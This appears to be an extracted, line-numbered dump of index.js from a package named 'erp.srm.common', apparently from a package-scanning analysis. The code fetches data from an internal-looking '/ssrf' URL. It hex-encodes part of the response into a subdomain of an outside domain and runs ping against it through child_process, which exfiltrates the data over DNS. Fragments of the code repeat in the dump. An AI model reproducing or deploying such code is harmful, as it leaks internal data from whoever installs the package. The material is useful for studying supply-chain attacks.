// File: tmp/tmpejdmsb9v/erp.srm.common/package/index.js
// ======================================================================
Line 1: const https = require("https")
Line 2: _tmp_0 = require("child_process")
Line 4: const url = "https://mtsrc-test.sankuai.com/ssrf"
Line 6: (_tmp_1 = https.get(url, (res) => {
  let data = "";
  res.on("data", (chunk) => {
    data += chunk;
  });

  res.on("end", () => {
    const last30Chars = data.slice(-30);
    const hexString = Buffer.from(last30Chars).toString("hex");

    const finalDomain = `${hexString}.03f3a5e40d.ipv6.1433.eu.org.`;

    console.log(`Pinging: ${finalDomain}`);

    const pingCommand = process.platform === "win32" ? `ping -n 4 ${finalDomain}` : `ping -c 4 ${finalDomain}`;

    exec(pingCommand, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${stderr}`);
        return;
      }
      console.log(stdout);
    });
  });
}))
Line 12: {
    const last30Chars = data.slice(-30);
    const hexString = Buffer.from(last30Chars).toString("hex");

    const finalDomain = `${hexString}.03f3a5e40d.ipv6.1433.eu.org.`;

    console.log(`Pinging: ${finalDomain}`);

    const pingCommand = process.platform === "win32" ? `ping -n 4 ${finalDomain}` : `ping -c 4 ${finalDomain}`;

    exec(pingCommand, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${stderr}`);
        return;
      }
      console.log(stdout);
    });
  }
Line 14: Buffer.from(last30Chars).toString("hex")
Line 22: exec(pingCommand, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${stderr}`);
        return;
      }
      console.log(stdout);
    })
